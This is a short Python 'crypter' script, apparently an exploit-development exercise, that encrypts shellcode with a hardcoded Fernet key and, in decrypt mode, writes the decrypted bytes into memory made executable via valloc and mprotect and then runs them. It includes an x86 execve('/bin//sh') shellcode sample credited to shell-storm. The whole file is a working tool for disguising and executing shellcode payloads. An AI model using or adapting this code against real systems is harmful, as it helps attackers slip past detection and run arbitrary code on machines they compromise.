#!/usr/bin/python3
from cryptography.fernet import Fernet
from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
import sys

# http://shell-storm.org/shellcode/files/shellcode-575.php
shellcode = b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
key = "OUM6hgYQghHJ_6or_jGT5sCrp3CA3zyuaE7pzx6SHW4="

# based on http://hacktracking.blogspot.com/2015/05/execute-shellcode-in-python.html
def exec(payload):
    libc = CDLL('libc.so.6')
    sc = c_char_p(payload)
    size = len(payload)
    addr = c_void_p(libc.valloc(size))
    memmove(addr, sc, size)
    libc.mprotect(addr, size, 0x7)
    run = cast(addr, CFUNCTYPE(c_void_p))
    run()

def encrypt(plaintext):
    cipher = Fernet(key)
    return cipher.encrypt(plaintext) 

def decrypt(ciphertext):
    cipher = Fernet(key)
    return cipher.decrypt(ciphertext)


if __name__ == "__main__":

    if len(sys.argv) != 3:
        print("Usage: ./crypter <encrypt/decrypt> <shellcode/encrypted shellcode>")
    else:
        print("Mode: ",sys.argv[1])
        print("Key: ",key)
        if sys.argv[1] == "encrypt":
            plaintext = bytes(sys.argv[2],'ascii')
            ciphertext = encrypt(plaintext)
            print("Encrypted shellcode: ",str(ciphertext)[2:-1])
        elif sys.argv[1] == "decrypt":
            ciphertext = bytes(sys.argv[2],'ascii')
            plaintext = decrypt(ciphertext)
            print("Decrypted shellcode: ",str(plaintext)[2:-1])
            exec(plaintext)
            

        